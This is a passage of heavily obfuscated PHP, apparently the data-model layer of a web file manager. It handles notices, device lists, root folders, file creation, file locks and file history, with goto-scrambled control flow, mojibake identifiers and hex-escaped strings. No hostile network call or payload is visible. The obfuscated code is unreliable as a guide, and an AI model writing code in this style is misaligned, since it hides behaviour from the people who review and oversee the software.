$A‹ŸÈÇÏŞ[$e›á—•ãá÷[1441]] = isset($F±ÁÆªœšö[$dÃĞè´¦Ä¥]) ? $F±ÁÆªœšö[$dÃĞè´¦Ä¥] : $f“âÉåø¹À; goto AˆËº‰Â™; d¼ŒòÇÙ¡á: $dÃĞè´¦Ä¥ = $A‹ŸÈÇÏŞ[$e›á—•ãá÷[29]]; $eêãç¡Ø = isset($dÜµ†¨òØó[$A‹ŸÈÇÏŞ[$e›á—•ãá÷[1535]]]) ? $dÜµ†¨òØó[$A‹ŸÈÇÏŞ[$e›á—•ãá÷[1535]]] : !1; $f“âÉåø¹À = strpos($dÃĞè´¦Ä¥, $e›á—•ãá÷[2104]) === 0 ? LNG($e›á—•ãá÷[2105]) : LNG($e›á—•ãá÷[2100]); goto D‘©ÑÍÙì…; AˆËº‰Â™: $A‹ŸÈÇÏŞ[$e›á—•ãá÷[1856]] = $eêãç¡Ø; $CÎ¥Ú”ÔÌ… = json_decode($A‹ŸÈÇÏŞ[$e›á—•ãá÷[440]], !0); $A‹ŸÈÇÏŞ[$e›á—•ãá÷[2097]] = isset($CÎ¥Ú”ÔÌ…[$e›á—•ãá÷[2097]]) ? $CÎ¥Ú”ÔÌ…[$e›á—•ãá÷[2097]] : $e›á—•ãá÷[33]; goto FëÃ“¼¾ğ; b»’‰áÀ»“: } $this->clearSystemPathLog($e—à´åè®â); goto D˜ÄÊ‹õ; EÀùô»‡¬‡: $B¢æ³Ê‘…´ = $this->getSourceList($b™êåÂØ‹Ş); $F±ÁÆªœšö = $this->typeAll(); $fİ²¼´›ºÁ = array(); goto F£¥¦¤ÓŠÉ; D˜ÄÊ‹õ: return $fİ²¼´›ºÁ; goto c³îÎ—øÊî; c³îÎ—øÊî: } private function clearSystemPathLog($bç«ÎÊê¸ˆ) { $Cç¯ìÜˆğÑ =& $_SERVER[úÉ·öƒÑì©]; if (count($bç«ÎÊê¸ˆ) == 0) { return; } $DøéÁ†‰›Â = array($Cç¯ìÜˆğÑ[402] => array($Cç¯ìÜˆğÑ[7], array_unique($bç«ÎÊê¸ˆ))); $this->where($DøéÁ†‰›Â)->delete(); } public function deviceList($dÁ­Äê’–£, $føö¼¿¨îŞ = 0) { $DİŒ•ƒ«ßÏ =& $_SERVER[úÉ·öƒÑì©]; $eƒôÑœ‰è = array($DİŒ•ƒ«ßÏ[1535] => $dÁ­Äê’–£, $DİŒ•ƒ«ßÏ[194] => array($DİŒ•ƒ«ßÏ[979], $føö¼¿¨îŞ), $DİŒ•ƒ«ßÏ[29] => $DİŒ•ƒ«ßÏ[1639]); $BŞ©„°ÈŸ§ = array(); $F­¾ˆ±·õÌ = $this->field($DİŒ•ƒ«ßÏ[2107])->where($eƒôÑœ‰è)->order($DİŒ•ƒ«ßÏ[1924])->limit(50)->select(); foreach ($F­¾ˆ±·õÌ as $BİÛ›ÏÀ±¤ => $C¼¶ÔĞ¿«) { goto BÚŞÕ³‘Ã; BÚŞÕ³‘Ã: if ($BİÛ›ÏÀ±¤ > 0 && abs($C¼¶ÔĞ¿«[$DİŒ•ƒ«ßÏ[194]] - $F­¾ˆ±·õÌ[$BİÛ›ÏÀ±¤ - 1][$DİŒ•ƒ«ßÏ[194]]) < 5) { continue; } $C õêÓ”±ø = json_decode($C¼¶ÔĞ¿«[$DİŒ•ƒ«ßÏ[440]], !0); $C¼¶ÔĞ¿«[$DİŒ•ƒ«ßÏ[2097]] = isset($C õêÓ”±ø[$DİŒ•ƒ«ßÏ[2097]]) ? $C õêÓ”±ø[$DİŒ•ƒ«ßÏ[2097]] : $DİŒ•ƒ«ßÏ[33]; goto a˜¿ŞŠœ‰ê; a˜¿ŞŠœ‰ê: unset($C õêÓ”±ø[$DİŒ•ƒ«ßÏ[2097]]); $bÆßÅ¿Š™ê = $this->deviceType($C õêÓ”±ø[$DİŒ•ƒ«ßÏ[1915]]); if (isset($BŞ©„°ÈŸ§[$bÆßÅ¿Š™ê])) { continue; } goto díÅÜ“ÈÊÖ; díÅÜ“ÈÊÖ: $this->ipAddress($C¼¶ÔĞ¿«); $C¼¶ÔĞ¿«[$DİŒ•ƒ«ßÏ[440]] = $C õêÓ”±ø; $BŞ©„°ÈŸ§[$bÆßÅ¿Š™ê] = $C¼¶ÔĞ¿«; goto A±¸‚¡©Ğ¬; A±¸‚¡©Ğ¬: } return array_values($BŞ©„°ÈŸ§); } public function deviceType($Bèêè§ƒ¥à) { return $Bèêè§ƒ¥à; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\155\56\156\x6f\x74\151\x63\x65\114\151\x73\164"; public $field = array("\156\x61\x6d\145", "\143\x6f\156\164\x65\156\x74", "\x61\165\164\x68", "\x6d\157\144\145", "\x74\151\x6d\x65", "\164\171\160\x65", "\154\145\x76\145\154", "\145\x6e\141\x62\154\x65", "\163\157\x72\164"); public function listData($E¤Ë¶ˆ‚Ù = false, $A˜ò‡ËÜ = "\x73\x6f\162\164", $D¼Ø÷ ´¾å = false) { return parent::listData($E¤Ë¶ˆ‚Ù, $A˜ò‡ËÜ, $D¼Ø÷ ´¾å); } public function add($Côù”ë´¹İ) { $c¼ê“äà£— =& $_SERVER[úÉ·öƒÑì©]; $a™Ú×‘î¼ = time(); if ($Côù”ë´¹İ[$c¼ê“äà£—[12]] == $c¼ê“äà£—[2108]) { $a™Ú×‘î¼ = strtotime($Côù”ë´¹İ[$c¼ê“äà£—[197]]); } $Côù”ë´¹İ[$c¼ê“äà£—[197]] = $a™Ú×‘î¼; return parent::insert($Côù”ë´¹İ); } public function update($C×†áÜ õ, $bÆÒë¨øù) { goto AØ«¯›åÎß; AØ«¯›åÎß: $C‡öñ¢‚ïÛ =& $_SERVER[úÉ·öƒÑì©]; $DŞ¾Ğ¨ÙĞ¥ = $this->listData($C×†áÜ õ); if (!$DŞ¾Ğ¨ÙĞ¥) { return !1; } goto Aµ¬„Ò¢ˆ’; Aµ¬„Ò¢ˆ’: $E‰¦÷˜ƒ¦³ = time(); if ($bÆÒë¨øù[$C‡öñ¢‚ïÛ[12]] == $C‡öñ¢‚ïÛ[2108]) { $E‰¦÷˜ƒ¦³ = strtotime($bÆÒë¨øù[$C‡öñ¢‚ïÛ[197]]); } $bÆÒë¨øù[$C‡öñ¢‚ïÛ[197]] = $E‰¦÷˜ƒ¦³; goto E–ºó†‹Æ; E–ºó†‹Æ: return parent::update($C×†áÜ õ, $bÆÒë¨øù); goto A¯Èö±ğé‹; A¯Èö±ğé‹: } public function remove($AÍ£—Î©¢¶) { $C­´¶²ô« = $this->listData($AÍ£—Î©¢¶); if (!$C­´¶²ô« || $C­´¶²ô«[$_SERVER[úÉ·öƒÑì©][1178]]) { return !1; } return parent::remove($AÍ£—Î©¢¶); } public function sort($B×£¢Å•×æ, $A»ÏÖ•Ê„…) { return parent::update($B×£¢Å•×æ, $A»ÏÖ•Ê„…); } public function enable($f‡„¸ÀŞ—Š, $dĞ¨Úâä¬) { return parent::update($f‡„¸ÀŞ—Š, array($_SERVER[úÉ·öƒÑì©][2109] => $dĞ¨Úâä¬)); } private function initUserOption() { $BíÚ‚…Û§æ =& $_SERVER[úÉ·öƒÑì©]; $this->optionType = $BíÚ‚…Û§æ[2110]; $this->modelType = $BíÚ‚…Û§æ[2111]; $this->field = array($BíÚ‚…Û§æ[2112], $BíÚ‚…Û§æ[28], $BíÚ‚…Û§æ[197], $BíÚ‚…Û§æ[29], $BíÚ‚…Û§æ[2113], $BíÚ‚…Û§æ[726], $BíÚ‚…Û§æ[189]); } public function userNoticeGet($Bİ¾¢•Œª– = false) { $this->initUserOption(); return parent::listData($Bİ¾¢•Œª–, $_SERVER[úÉ·öƒÑì©][402], !0); } public function userNoticeAdd($d¢â¤’®œ) { $eÃ‹­×Á‘æ =& $_SERVER[úÉ·öƒÑì©]; $this->initUserOption(); $aø™¶‡‚— = $this->findByKey($eÃ‹­×Á‘æ[2112], $d¢â¤’®œ[$eÃ‹­×Á‘æ[402]]); if ($aø™¶‡‚—) { return !0; } $c±Â¼˜È‡ = array($eÃ‹­×Á‘æ[2112] => $d¢â¤’®œ[$eÃ‹­×Á‘æ[402]], $eÃ‹­×Á‘æ[28] => $d¢â¤’®œ[$eÃ‹­×Á‘æ[28]], $eÃ‹­×Á‘æ[197] => $d¢â¤’®œ[$eÃ‹­×Á‘æ[197]], $eÃ‹­×Á‘æ[29] => isset($d¢â¤’®œ[$eÃ‹­×Á‘æ[29]]) ? $d¢â¤’®œ[$eÃ‹­×Á‘æ[29]] : 1, $eÃ‹­×Á‘æ[2113] => isset($d¢â¤’®œ[$eÃ‹­×Á‘æ[2113]]) ? $d¢â¤’®œ[$eÃ‹­×Á‘æ[2113]] : 0, $eÃ‹­×Á‘æ[726] => 0, $eÃ‹­×Á‘æ[189] => 0); return parent::insert($c±Â¼˜È‡); } public function userNoticeEdit($fÎçâÔ‡Ğ, $c¸ÚÕñÉÉØ) { $this->initUserOption(); return parent::update($fÎçâÔ‡Ğ, $c¸ÚÕñÉÉØ); } } goto F›Ü µİ£; cËŠ¨ó…ù: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($EÉˆ»Èå”É) { $c·¦¾îÈâ =& $_SERVER[úÉ·öƒÑì©]; $CÖá¬ğŞ©â = Model($c·¦¾îÈâ[511])->where(array($c·¦¾îÈâ[1527] => $EÉˆ»Èå”É))->find(); $BïÀ«ƒ‰âº = $this->_mkdirRoot(SourceModel::TYPE_USER, $EÉˆ»Èå”É, $CÖá¬ğŞ©â[$c·¦¾îÈâ[28]]); $this->userDesktopAdd($BïÀ«ƒ‰âº); return $BïÀ«ƒ‰âº; } public function userDesktopAdd($EëÜµÜù) { $fÉ§¤ßÈ‹« =& $_SERVER[úÉ·öƒÑì©]; $EÎ†¸‹ç™» = LNG($fÉ§¤ßÈ‹«[1958]); $e„Ş÷§ˆœ‰ = $this->mkdir($EëÜµÜù, $EÎ†¸‹ç™»); $this->metaSet($e„Ş÷§ˆœ‰, $fÉ§¤ßÈ‹«[1959], $fÉ§¤ßÈ‹«[87]); $this->metaSet($EëÜµÜù, $fÉ§¤ßÈ‹«[1960], $e„Ş÷§ˆœ‰); } public function groupRootAdd($Eö©Õ°‘ñê) { $eŞ§¼×ÛèŸ =& $_SERVER[úÉ·öƒÑì©]; $cõ´ãñÍÆ· = Model($eŞ§¼×ÛèŸ[495])->where(array($eŞ§¼×ÛèŸ[1777] => $Eö©Õ°‘ñê))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Eö©Õ°‘ñê, $cõ´ãñÍÆ·[$eŞ§¼×ÛèŸ[28]]); } public function systemRootPathAdd($B–À¬äªºÏ) { if ($B–À¬äªºÏ != $_SERVER[úÉ·öƒÑì©][514]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $B–À¬äªºÏ); } public function userRootRemove($f÷§²ÒÆŠã) { $DŸœ«ó¯¦¬ = $this->sourceRoot(SourceModel::TYPE_USER, $f÷§²ÒÆŠã); if (!$DŸœ«ó¯¦¬) { return; } $this->remove($DŸœ«ó¯¦¬, !1); } public function groupRootRemove($dóóÉã ¦Ö) { $eŸ‰Í¡ƒ = $this->sourceRoot(SourceModel::TYPE_GROUP, $dóóÉã ¦Ö); if (!$eŸ‰Í¡ƒ) { return; } $this->remove($eŸ‰Í¡ƒ, !1); } private function _mkdirRoot($A¸Û—ììŒ, $F ‹ãÑë Õ, $DŠí†×Ï) { goto e›Îà˜Ûùß; cŒŠ‰×Œò: CacheLock::unlock($C†ÏÂ£¨ÁÆ); return $fòÏĞö¶šµ; goto fÇ…Çô›íŸ; e›Îà˜Ûùß: $DîÕÎŒĞå =& $_SERVER[úÉ·öƒÑì©]; $DØ÷¸šà = array($DîÕÎŒĞå[403] => 0, $DîÕÎŒĞå[558] => $A¸Û—ììŒ, $DîÕÎŒĞå[559] => $F ‹ãÑë Õ, $DîÕÎŒĞå[555] => 1, $DîÕÎŒĞå[560] => USER_ID, $DîÕÎŒĞå[561] => USER_ID, $DîÕÎŒĞå[556] => $DîÕÎŒĞå[33], $DîÕÎŒĞå[562] => $DîÕÎŒĞå[507], $DîÕÎŒĞå[431] => 0, $DîÕÎŒĞå[557] => 0, $DîÕÎŒĞå[457] => 0, $DîÕÎŒĞå[563] => $DîÕÎŒĞå[33]); if ($CóÑå†½Ÿ = $this->where($DØ÷¸šà)->find()) { return $CóÑå†½Ÿ[$DîÕÎŒĞå[404]]; } goto aÊ·äµÒØƒ; aÊ·äµÒØƒ: $C†ÏÂ£¨ÁÆ = "\x4d\157\x64\x65\x6c\123\157\x75\x72\143\145\x2e\155\153\144\151\x72\x52\x6f\157\x74\56{$A¸Û—ììŒ}\56{$F ‹ãÑë Õ}\56" . $DŠí†×Ï; CacheLock::lock($C†ÏÂ£¨ÁÆ); $DØ÷¸šà[$DîÕÎŒĞå[28]] = $DŠí†×Ï; goto f¡Ü–ñ˜²; f¡Ü–ñ˜²: $fòÏĞö¶šµ = $this->add($DØ÷¸šà); $cÛğ†äôô… = array($DîÕÎŒĞå[564] => short_id($fòÏĞö¶šµ)); $this->where(array($DîÕÎŒĞå[419] => $fòÏĞö¶šµ))->save($cÛğ†äôô…); goto cŒŠ‰×Œò; fÇ…Çô›íŸ: } private function sourceRoot($e­ìª“Ùí, $EÏÊ‰‘ƒ¢£, $AÛÓŒµ ¼ñ = false) { $d†óóéôË =& $_SERVER[úÉ·öƒÑì©]; $Cí æÎâç› = array($d†óóéôË[403] => 0, $d†óóéôË[558] => $e­ìª“Ùí, $d†óóéôË[559] => $EÏÊ‰‘ƒ¢£); if ($A¶è©†¶š… = $this->where($Cí æÎâç›)->find()) { return $AÛÓŒµ ¼ñ ? $A¶è©†¶š… : $A¶è©†¶š…[$d†óóéôË[404]]; } return !1; } public function sourceRootGroup($c–›Ğ›‡¾) { goto cÛè»©ğ‚ˆ; c„±åôªÏ±: $this->selectPageReset(); $eŸ¸Ğñ¾äÔ = $this->listSource($A¡Ş™ØÃ×à, 1000); $this->selectPageRestore(); goto Fç…Úá¶î; Fç…Úá¶î: return array_to_keyvalue($eŸ¸Ğñ¾äÔ[$B‚Ù¡œÏÚ¨[75]], $B‚Ù¡œÏÚ¨[493]); goto b—­—¯îèÕ; cÛè»©ğ‚ˆ: $B‚Ù¡œÏÚ¨ =& $_SERVER[úÉ·öƒÑì©]; if (is_string($c–›Ğ›‡¾)) { $c–›Ğ›‡¾ = array($c–›Ğ›‡¾); } $A¡Ş™ØÃ×à = array($B‚Ù¡œÏÚ¨[403] => 0, $B‚Ù¡œÏÚ¨[558] => SourceModel::TYPE_GROUP, $B‚Ù¡œÏÚ¨[559] => array($B‚Ù¡œÏÚ¨[7], $c–›Ğ›‡¾)); goto c„±åôªÏ±; b—­—¯îèÕ: } public function mkfile($a£‹ØªÅ¥Ú, $B¯Ş£ŒÛ„, $A—»Î‚œÑß = '', $AùÊ‘›ŒÒ = REPEAT_RENAME) { $DîÍ•÷¦İ‰ =& $_SERVER[úÉ·öƒÑì©]; $Féñ³Ù¼ = Model($DîÍ•÷¦İ‰[580])->addFileByContent($A—»Î‚œÑß, $B¯Ş£ŒÛ„); return $this->_createFileCall($a£‹ØªÅ¥Ú, $B¯Ş£ŒÛ„, $Féñ³Ù¼, $AùÊ‘›ŒÒ, $DîÍ•÷¦İ‰[1223]); } public function addFile($Fô¦¸Àñ, $c‰ƒíÚäƒÜ, $fîéªøÁ‡Â, $DÚ‡•Ú‡Å‰ = false, $BËñã¶²ê© = REPEAT_RENAME) { $C®ËŒÆ—àÓ = Model($_SERVER[úÉ·öƒÑì©][580])->addFile($c‰ƒíÚäƒÜ, $fîéªøÁ‡Â, $DÚ‡•Ú‡Å‰); return $this->_createFileCall($Fô¦¸Àñ, $fîéªøÁ‡Â, $C®ËŒÆ—àÓ, $BËñã¶²ê©); } public function addFileByFileID($CòÂÍ‹Ò”¹, $f“ã¦àÍ‹æ, $C‹¿ĞŒ‹Ì, $f¦êãçï’Ö = REPEAT_RENAME) { $fõ¸ù¥­¨ˆ =& $_SERVER[úÉ·öƒÑì©]; $c²Ñº¦¸ï = Model($fõ¸ù¥­¨ˆ[580])->find($f“ã¦àÍ‹æ); Model($fõ¸ù¥­¨ˆ[580])->linkAdd($f“ã¦àÍ‹æ); return $this->_createFileCall($CòÂÍ‹Ò”¹, $C‹¿ĞŒ‹Ì, $c²Ñº¦¸ï, $f¦êãçï’Ö); } public function addFileByRemote($bÅ‡²¿õŞ®, $c¢®¥À„ğ, $dÓØÉİµ, $f’˜Şò±«Œ = array(), $dÌíËàÎ = REPEAT_RENAME) { $CÔìãëï„— = Model($_SERVER[úÉ·öƒÑì©][580])->addFileByRemote($c¢®¥À„ğ, $dÓØÉİµ, $f’˜Şò±«Œ); return $this->_createFileCall($bÅ‡²¿õŞ®, $dÓØÉİµ, $CÔìãëï„—, $dÌíËàÎ); } private function _createFileCall($A—ÇÏ¸ï¹·, $C¨‡²ªÄ˜, $DÁµˆéÏÌã, $Dî¥óÅ ‹, $Bçˆ‰èÆ¼§ = "\x75\x70\x6c\157\x61\x64") { goto Eíã¡ù…§; BááÈ½¼ê®: $Eç‡ªíÜ°‹ = $this->fileNameExist($A—ÇÏ¸ï¹·, $C¨‡²ªÄ˜); $Eˆçë×äê¶ = $this->_createFile($A—ÇÏ¸ï¹·, $C¨‡²ªÄ˜, $DÁµˆéÏÌã, $Dî¥óÅ ‹, $b˜Äà£Şß®); if (!$b˜Äà£Şß®) { Model($fŠø¬ÛæÛ¿[459])->remove($DÁµˆéÏÌã[$fŠø¬ÛæÛ¿[456]]); } goto EÆ»ŠÇ¥ğ¡; Eíã¡ù…§: $fŠø¬ÛæÛ¿ =& $_SERVER[úÉ·öƒÑì©]; $b˜Äà£Şß® = !1; $this->lockWriteStart($A—ÇÏ¸ï¹·, $C¨‡²ªÄ˜); goto BááÈ½¼ê®; EÆ»ŠÇ¥ğ¡: if ($b˜Äà£Şß® && $Eˆçë×äê¶ && $Eˆçë×äê¶ != $Eç‡ªíÜ°‹) { Model($fŠø¬ÛæÛ¿[1929])->eventCreate($Eˆçë×äê¶, $Bçˆ‰èÆ¼§); } $this->lockWriteEnd($A—ÇÏ¸ï¹·, $C¨‡²ªÄ˜); return $Eˆçë×äê¶; goto E«Ê”¢•ï; E«Ê”¢•ï: } public function mkdir($Dî§„Á±‰, $eÍ–ØÓ£èÜ, $cî¿„ªÅ‘ = REPEAT_SKIP) { goto f ˆùŞ±œ; D¤ÍÔòäè¥: $this->lockWriteStart($Dî§„Á±‰, $eÍ–ØÓ£èÜ); if ($cî¿„ªÅ‘ !== !1) { $F†ïäô­Ë‰ = $this->fileNameExist($Dî§„Á±‰, $eÍ–ØÓ£èÜ); if ($F†ïäô­Ë‰ && $cî¿„ªÅ‘ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Dî§„Á±‰, $eÍ–ØÓ£èÜ); return $F†ïäô­Ë‰; } $eÍ–ØÓ£èÜ = $this->fileNameAuto($Dî§„Á±‰, $eÍ–ØÓ£èÜ, $cî¿„ªÅ‘); } $a¸ÓÜôÇ¾ª = array($AÌÉ‰óÒ†ö[555] => 1, $AÌÉ‰óÒ†ö[422] => $eÍ–ØÓ£èÜ, $AÌÉ‰óÒ†ö[556] => $AÌÉ‰óÒ†ö[33], $AÌÉ‰óÒ†ö[457] => 0, $AÌÉ‰óÒ†ö[557] => 0); goto FÑˆĞ”Šƒ®; f ˆùŞ±œ: $AÌÉ‰óÒ†ö =& $_SERVER[úÉ·öƒÑì©]; $CŸèÎÉ¡ñº = $this->sourceInfo($Dî§„Á±‰); if (!$CŸèÎÉ¡ñº) { return !1; } goto D¤ÍÔòäè¥; cßÇáÖ‰¶ˆ: return $d¾ÄÈöĞ‡ô; goto FæñŸ­‚İ…; FÑˆĞ”Šƒ®: $d¾ÄÈöĞ‡ô = $this->_addSoure($a¸ÓÜôÇ¾ª, $CŸèÎÉ¡ñº); Model($AÌÉ‰óÒ†ö[1929])->eventCreate($d¾ÄÈöĞ‡ô, $AÌÉ‰óÒ†ö[1224]); $this->lockWriteEnd($Dî§„Á±‰, $eÍ–ØÓ£èÜ); goto cßÇáÖ‰¶ˆ; FæñŸ­‚İ…: } private function _createFile($aóœ‰¯âÆ, $A§ä¶Ï÷Íâ, $Fô†¦¼å¸Û, $FçÔÄñ÷ÀÛ, &$e©îãáÕæ) { goto bß–øÂÃ¬º; bß–øÂÃ¬º: $C÷˜†±¥èŒ =& $_SERVER[úÉ·öƒÑì©]; $E¬ëÃ¥” = $this->sourceInfo($aóœ‰¯âÆ); if (!$Fô†¦¼å¸Û || !$E¬ëÃ¥”) { return !1; } goto bíÛæ¡Ë‚Õ; FÁ­Ì£ÇË¾: $eªÙ®×ìÄœ = array($C÷˜†±¥èŒ[555] => 0, $C÷˜†±¥èŒ[422] => $A§ä¶Ï÷Íâ, $C÷˜†±¥èŒ[556] => substr(get_path_ext($A§ä¶Ï÷Íâ), 0, 10), $C÷˜†±¥èŒ[457] => $Fô†¦¼å¸Û[$C÷˜†±¥èŒ[456]], $C÷˜†±¥èŒ[557] => $Fô†¦¼å¸Û[$C÷˜†±¥èŒ[78]]); $d¨¢¿‡’×” = $this->_addSoure($eªÙ®×ìÄœ, $E¬ëÃ¥”); $this->folderSizeReset($aóœ‰¯âÆ, intval($eªÙ®×ìÄœ[$C÷˜†±¥èŒ[78]])); goto cË¶Ç°ªœ; cË¶Ç°ªœ: return $d¨¢¿‡’×”; goto EÎ°Í–¢„; bíÛæ¡Ë‚Õ: if ($FçÔÄñ÷ÀÛ !== !1) { $F¥òèÕË’¥ = $this->fileNameExist($aóœ‰¯âÆ, $A§ä¶Ï÷Íâ); } $e©îãáÕæ = !0; if ($FçÔÄñ÷ÀÛ && $F¥òèÕË’¥) { if ($FçÔÄñ÷ÀÛ == REPEAT_SKIP) { $e©îãáÕæ = !1; return $F¥òèÕË’¥; } else { if ($FçÔÄñ÷ÀÛ == REPEAT_REPLACE) { $câÒÍ­ÄÜ = $this->sourceInfo($F¥òèÕË’¥); $e„”Á§ï = $this->fileHistory($câÒÍ­ÄÜ, $Fô†¦¼å¸Û[$C÷˜†±¥èŒ[456]], $Fô†¦¼å¸Û[$C÷˜†±¥èŒ[78]]); if (!$e„”Á§ï) { $e©îãáÕæ = !1; } else { $this->folderSizeReset($aóœ‰¯âÆ); } return $F¥òèÕË’¥; } else { $A§ä¶Ï÷Íâ = $this->fileNameAuto($aóœ‰¯âÆ, $A§ä¶Ï÷Íâ, $FçÔÄñ÷ÀÛ, !1); } } } goto FÁ­Ì£ÇË¾; EÎ°Í–¢„: } protected function fileHistory($c»õõÚÊº˜, $dÂ×áˆóÈ¬, $C‡õ¤ÃöãÅ) { goto bñ¤ÂÛóùÏ; bñ¤ÂÛóùÏ: $cÍ›İƒ²àÏ =& $_SERVER[úÉ·öƒÑì©]; if ($c»õõÚÊº˜[$cÍ›İƒ²àÏ[456]] == $dÂ×áˆóÈ¬) { return !1; } $this->checkLock($c»õõÚÊº˜[$cÍ›İƒ²àÏ[404]], $dÂ×áˆóÈ¬); goto C»È—½ª; aêïÚÖØ‹Õ: $this->sourceCacheClear($c»õõÚÊº˜[$cÍ›İƒ²àÏ[404]]); return !0; goto a£•óìæÕ‚; C»È—½ª: Model($cÍ›İƒ²àÏ[1961])->addHistory($c»õõÚÊº˜); $b—Šã‚ßõ = array($cÍ›İƒ²àÏ[561] => USER_ID, $cÍ›İƒ²àÏ[426] => time(), $cÍ›İƒ²àÏ[456] => $dÂ×áˆóÈ¬, $cÍ›İƒ²àÏ[78] => $C‡õ¤ÃöãÅ); $this->where(array($cÍ›İƒ²àÏ[419] => $c»õõÚÊº˜[$cÍ›İƒ²àÏ[404]]))->save($b—Šã‚ßõ); goto aêïÚÖØ‹Õ; a£•óìæÕ‚: } public function checkLock($D¶äƒ­ÇÆ, $B§„¨»îéã) { goto f–Œ±ÊÑ‚ê; f–Œ±ÊÑ‚ê: $e£ßƒ“‹ƒÖ =& $_SERVER[úÉ·öƒÑì©]; $DªøèÉÃŞ = $this->pathInfo($D¶äƒ­ÇÆ); if (!$this->fileIsLock($DªøèÉÃŞ, !0)) { return; } goto CÃùø“ñ¯; c‹çÌæ‘·: show_json(LNG($e£ßƒ“‹ƒÖ[1964]) . $e£ßƒ“‹ƒÖ[1965] . LNG($e£ßƒ“‹ƒÖ[1966]) . $e£ßƒ“‹ƒÖ[1967] . $eªÀŠŒõÌ³ . $e£ßƒ“‹ƒÖ[1968], !1); goto fåÃ˜îôÜò; aöÙ‘ŸÖõ: $this->_createFileCall($DªøèÉÃŞ[$e£ßƒ“‹ƒÖ[487]], $F§ŒªÛÙì—, $fæïƒåÌ×Ó, REPEAT_REPLACE, $e£ßƒ“‹ƒÖ[1223]); $EÉØ“ò­²Ù = $DªøèÉÃŞ[$e£ßƒ“‹ƒÖ[454]][$e£ßƒ“‹ƒÖ[519]]; $eªÀŠŒõÌ³ = $EÉØ“ò­²Ù[$e£ßƒ“‹ƒÖ[1963]] ? $EÉØ“ò­²Ù[$e£ßƒ“‹ƒÖ[1963]] : $EÉØ“ò­²Ù[$e£ßƒ“‹ƒÖ[28]]; goto c‹çÌæ‘·; CÃùø“ñ¯: $cæœœìæÒˆ = Session::get($e£ßƒ“‹ƒÖ[1962]); $F§ŒªÛÙì— = substr($DªøèÉÃŞ[$e£ßƒ“‹ƒÖ[28]], 0, -1 - strlen($DªøèÉÃŞ[$e£ßƒ“‹ƒÖ[168]])) . $e£ßƒ“‹ƒÖ[1488] . $cæœœìæÒˆ . $e£ßƒ“‹ƒÖ[95] . $DªøèÉÃŞ[$e£ßƒ“‹ƒÖ[168]]; $fæïƒåÌ×Ó = Model($e£ßƒ“‹ƒÖ[580])->find($B§„¨»îéã); goto aöÙ‘ŸÖõ; fåÃ˜îôÜò: } public function fileIsLock($cìƒ–ÖŠË, $E‡ì‘Œß×í = false) { goto Cöáºò¦ê; Bù·àå‰ò: return !1; goto a¹°ëÍî­¨; a‰Ö–æºò: $e¦öâØ‘› = $GLOBALS[$E‹ë‹†–´´[6]][$E‹ë‹†–´´[88]][$E‹ë‹†–´´[517]]; if ($cìƒ–ÖŠË[$E‹ë‹†–´´[454]][$E‹ë‹†–´´[518]] <= time() - $e¦öâØ‘›) { $this->metaSet($cìƒ–ÖŠË[$E‹ë‹†–´´[404]], $E‹ë‹†–´´[516], null); $this->metaSet($cìƒ–ÖŠË[$E‹ë‹†–´´[404]], $E‹ë‹†–´´[518], null); } if ($E‡ì‘Œß×í) { $this->metaSet($cìƒ–ÖŠË[$E‹ë‹†–´´[404]], $E‹ë‹†–´´[518], time()); } goto Bù·àå‰ò; Cöáºò¦ê: $E‹ë‹†–´´ =& $_SERVER[úÉ·öƒÑì©]; if (!isset($cìƒ–ÖŠË[$E‹ë‹†–´´[454]]) || !$cìƒ–ÖŠË[$E‹ë‹†–´´[454]][$E‹ë‹†–´´[516]]) { return !1; } if ($cìƒ–ÖŠË[$E‹ë‹†–´´[454]][$E‹ë‹†–´´[516]] != USER_ID) { return !0; } goto a‰Ö–æºò; a¹°ëÍî­¨: } private function _addSoure($Eø’×îáÖ, $FõŠÏ„„ö) { goto A‡¢Ù™šíß; B†”ÃƒÃÍ¼: $D§à¬˜î¹ = array($dˆïªÙƒªœ[564] => short_id($Aîã’˜ÛñÅ)); $this->where(array($dˆïªÙƒªœ[419] => $Aîã’˜ÛñÅ))->save($D§à¬˜î¹); $this->setNamePinyin($Aîã’˜ÛñÅ, $Eø’×îáÖ[$dˆïªÙƒªœ[28]]); goto dğÚ °Ëùç; A‡¢Ù™šíß: $dˆïªÙƒªœ =& $_SERVER[úÉ·öƒÑì©]; $bŸßí™ÈÀÌ = array($dˆïªÙƒªœ[558] => $FõŠÏ„„ö[$dˆïªÙƒªœ[413]], $dˆïªÙƒªœ[559] => $FõŠÏ„„ö[$dˆïªÙƒªœ[493]], $dˆïªÙƒªœ[560] => USER_ID, $dˆïªÙƒªœ[561] => USER_ID, $dˆïªÙƒªœ[403] => $FõŠÏ„„ö[$dˆïªÙƒªœ[404]], $dˆïªÙƒªœ[562] => $FõŠÏ„„ö[$dˆïªÙƒªœ[496]] . $FõŠÏ„„ö[$dˆïªÙƒªœ[404]] . $dˆïªÙƒªœ[47], $dˆïªÙƒªœ[431] => 0, $dˆïªÙƒªœ[563] => $dˆïªÙƒªœ[33]); $Eø’×îáÖ = array_merge($bŸßí™ÈÀÌ, $Eø’×îáÖ); goto dŒî«¹¿‚¡; dŒî«¹¿‚¡: $this->updateModifyTime($Eø’×îáÖ[$dˆïªÙƒªœ[487]]); $BİŒ®ÅÑİ© = $dˆïªÙƒªœ[1969] . $FõŠÏ„„ö[$dˆïªÙƒªœ[404]]; if (isset(self::$cacheChildList[$BİŒ®ÅÑİ©])) { unset(self::$cacheChildList[$BİŒ®ÅÑİ©]); } goto C½³ÏïÂ¦©; C½³ÏïÂ¦©: static $AµÊ½ä¯ = false; if (!$AµÊ½ä¯) { Hook::trigger($dˆïªÙƒªœ[545], $Eø’×îáÖ); $AµÊ½ä¯ = !0; } $Aîã’˜ÛñÅ = $this->add($Eø’×îáÖ); goto B†”ÃƒÃÍ¼; dğÚ °Ëùç: return $Aîã’˜ÛñÅ; goto BÆôÇ‡š­Œ; BÆôÇ‡š­Œ: } public function remove($D‡îÍË¡‡, $fá¹ç÷Øñó = true) { goto cÁé©¤«Ú; døêÂÉë¤: $B±¹µÛŞÏ¨ = $DÍ‚ò™„ğ[$CÛÍ£©¾³[413]] == self::TYPE_USER ? $CÛÍ£©¾³[571] : $CÛÍ£©¾³[1023]; if ($B±¹µÛŞÏ¨ == 